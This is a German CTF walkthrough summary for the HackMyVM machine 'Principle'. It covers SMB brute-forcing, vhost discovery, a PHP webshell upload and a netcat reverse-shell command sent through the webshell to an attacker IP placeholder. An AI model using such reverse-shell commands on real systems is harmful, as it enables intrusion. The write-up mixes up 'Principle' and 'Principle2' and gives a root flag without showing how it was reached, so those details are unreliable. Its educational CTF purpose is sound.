# Principle - HackMyVM (Medium)

![Principle.png](Principle.png)

## Übersicht

*   **VM:** Principle
*   **Plattform:** HackMyVM (https://hackmyvm.eu/machines/machine.php?vm=Principle)
*   **Schwierigkeit:** Medium
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 18. Dezember 2023
*   **Original-Writeup:** https://alientec1908.github.io/Principle_HackMyVM_Medium/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel dieser Challenge war es, die User- und Root-Flags der Maschine "Principle" zu erlangen. Der Weg dorthin begann mit der Entdeckung eines virtuellen Hosts (`thetruthoftalos.hmv`), auf dem eine Webanwendung lief. Diese Anwendung war anfällig für eine Schwachstelle (vermutlich File Upload oder Command Injection über `index.php`), die das Hochladen und Ausführen einer PHP-Webshell (`ben.php`) im `/uploads/`-Verzeichnis ermöglichte. Dies führte zu initialem Zugriff als `www-data`. Die weitere Eskalation zu Root wurde im Bericht nicht vollständig dokumentiert, aber es wurden vielversprechende Vektoren identifiziert: eine SUID-Root-Binary (`/usr/bin/updater`) und eine `sudo`-Regel, die `www-data` erlaubte, `/usr/bin/cat` als Benutzer `talos` auszuführen.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `vi`
*   `nikto`
*   `nmap`
*   `gobuster`
*   `smbclient`
*   `crackmapexec`
*   `nbtscan` (impliziert für SMB-Enumeration)
*   `wfuzz`
*   `nc` (netcat)
*   `cat`
*   `xargs`
*   `tr`
*   `msfconsole` (impliziert für die Suche, aber kein Exploit ausgeführt)
*   `smbmap` (impliziert für SMB-Enumeration)
*   `showmount` (impliziert für NFS-Enumeration)
*   `mount` (impliziert für NFS-Enumeration)
*   `ngrep` (impliziert für Netzwerkanalyse)
*   `wget`
*   `exiftool` (impliziert für Bildanalyse)
*   `strings` (impliziert für Bildanalyse)
*   `steghide` (impliziert für Bildanalyse)
*   `stegsnow` (impliziert für Bildanalyse)
*   `binwalk` (impliziert für Bildanalyse)
*   `curl`
*   `find`
*   `ss`
*   `sudo`
*   Standard Linux-Befehle (`ls`, `id`)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Principle2" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Enumeration (Web, SMB, NFS, VHost):**
    *   IP-Adresse des Ziels (192.168.2.131) mit `arp-scan` identifiziert. Hostname `principle2.hmv` in `/etc/hosts` eingetragen.
    *   `nmap`-Scan offenbarte Port 80 (HTTP, Nginx 1.22.1 mit Apache-Default-Titel), 111 (RPCBind), 139/445 (SMB, Samba 4.6.2) und 2049 (NFS).
    *   `gobuster` auf `http://principle2.hmv` fand keine signifikanten Pfade.
    *   SMB-Enumeration (`enum4linux-ng` oder `crackmapexec`) fand die Shares `public` und `hermanubis` sowie die Benutzer `hermanubis`, `talos`, `byron`, `melville`.
    *   `crackmapexec smb` knackte das Passwort für `talos` zu `s13!34g$3FVA5e@ed`.
    *   `wfuzz` VHost-Enumeration fand `thetruthoftalos.hmv`. Dieser wurde in `/etc/hosts` eingetragen.
    *   Die Startseite von `http://thetruthoftalos.hmv` zeigte "NOTHING". `gobuster` auf diesem VHost fand `index.php` und das Verzeichnis `/uploads/`.
    *   Die `index.php` enthielt ein Formular, das einen `filename`-Parameter entgegennahm und auf eine mögliche Command Injection oder LFI hindeutete. Im `/uploads`-Verzeichnis wurden thematisch passende `.txt`-Dateien gefunden.
    *   Steganographie-Versuche auf eine `newjerusalem.jpg` (Herkunft unklar) blieben erfolglos.

2.  **Initial Access (Web RCE als `www-data`):**
    *   Eine (nicht im Detail gezeigte) Schwachstelle, vermutlich in `index.php` auf `thetruthoftalos.hmv` oder durch direkten Upload, ermöglichte das Platzieren einer PHP-Webshell (`ben.php`) im Verzeichnis `/uploads/`.
    *   Durch Aufrufen von `http://thetruthoftalos.hmv/uploads/ben.php?cmd=id` wurde RCE als `www-data` bestätigt.
    *   Mittels `curl "http://thetruthoftalos.hmv/uploads/ben.php?cmd=nc%20-e%20/bin/bash%20ANGRIFFS_IP%204444"` wurde eine Reverse Shell zu einem Netcat-Listener als `www-data` aufgebaut.

3.  **Privilege Escalation (Ansätze):**
    *   Als `www-data` wurde eine SUID-Root-Datei `/usr/bin/updater` (Gruppe `melville`) gefunden.
    *   `sudo -l` als `www-data` zeigte, dass `/usr/bin/cat` als Benutzer `talos` ohne Passwort ausgeführt werden durfte: `(talos) NOPASSWD: /usr/bin/cat`.
    *   Versuche, `/etc/shadow` mit `sudo -u talos cat /etc/shadow` zu lesen, scheiterten an den Rechten von `talos`.
    *   *Der Bericht endet hier, bevor eine erfolgreiche Eskalation zu `talos` oder `root` gezeigt wird.*

4.  **Flags (wie im Bericht angegeben, aber der Weg dorthin ist nicht vollständig dokumentiert):**
    *   User-Flag: `c7d0a8de1e03b25a6f7ed2d91b94dad6`
    *   Root-Flag: `5C42D6BB0EE9CE4CB7E7349652C45C4A`

## Wichtige Schwachstellen und Konzepte

*   **VHost Enumeration:** Auffinden der Subdomain `thetruthoftalos.hmv`.
*   **Schwache SMB-Credentials:** Das Passwort für den Benutzer `talos` konnte mittels Brute-Force geknackt werden.
*   **Webshell Upload / RCE:** Eine (nicht detailliert beschriebene) Schwachstelle erlaubte das Hochladen und Ausführen einer PHP-Webshell.
*   **SUID Binary:** Die Datei `/usr/bin/updater` (SUID Root, Gruppe `melville`) wurde als potenzieller Eskalationsvektor identifiziert.
*   **Unsichere `sudo`-Regel:** `www-data` durfte `cat` als `talos` ausführen, was das Lesen von Dateien im Kontext von `talos` ermöglicht.

## Flags

*   **User Flag:** `c7d0a8de1e03b25a6f7ed2d91b94dad6`
*   **Root Flag:** `5C42D6BB0EE9CE4CB7E7349652C45C4A`

## Tags

`HackMyVM`, `Principle`, `Medium`, `VHost Enumeration`, `SMB Brute-Force`, `Webshell Upload`, `RCE`, `SUID Binary`, `sudo Exploit`, `Linux`, `Web`, `Privilege Escalation`, `Nginx`, `Samba`, `NFS`, `Apache` (falscher Titel)
